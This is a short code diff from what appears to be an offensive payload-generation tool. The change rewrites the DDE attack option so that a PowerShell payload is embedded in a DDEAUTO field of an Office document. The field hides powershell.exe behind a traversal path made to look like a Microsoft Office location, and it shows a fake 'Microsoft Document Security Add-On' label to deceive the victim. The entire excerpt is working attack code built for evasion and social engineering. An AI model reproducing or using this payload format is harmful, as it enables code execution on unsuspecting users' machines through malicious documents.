@@ -579,7 +579,8 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
             # format for dde specific payload
             if attack_modifier == "dde":
-                full_attack = ('{DDEAUTO c:\\windows\\system32\\cmd.exe ""/k %s ""  }' % (full_attack))
+                full_attack = full_attack[11:] # remove powershell + 1 space
+                full_attack = ('DDEAUTO "C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe %s # " "Microsoft Document Security Add-On"' % (full_attack))
 
             write_file("powershell_attack.txt", full_attack)
             if attack_modifier != "dde":
